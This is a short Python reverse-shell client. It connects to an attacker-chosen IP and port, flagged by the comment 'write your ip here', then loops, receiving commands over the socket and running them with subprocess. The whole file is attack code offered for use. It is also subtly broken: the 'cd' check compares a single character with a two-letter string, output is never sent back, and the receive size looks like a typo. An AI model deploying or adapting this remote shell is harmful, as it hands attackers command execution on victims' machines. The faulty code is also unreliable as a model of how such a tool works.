import os
import socket
import subprocess

with socket.socket() as s:
    host='127.0.0.1' #write your ip here
    port=1234
    s.connect((host,port))
    # s.send(os.getcwd().encode)
    while True:
        command=s.recv(1204).decode()
        split_command=command.split()
        if command[0]=="cd":
            os.chdir("".join(split_command))
        else:
            output=subprocess.getoutput(command)
        if len(command)>0:
            output=subprocess.getoutput(command)
        if command=="quit":
            break
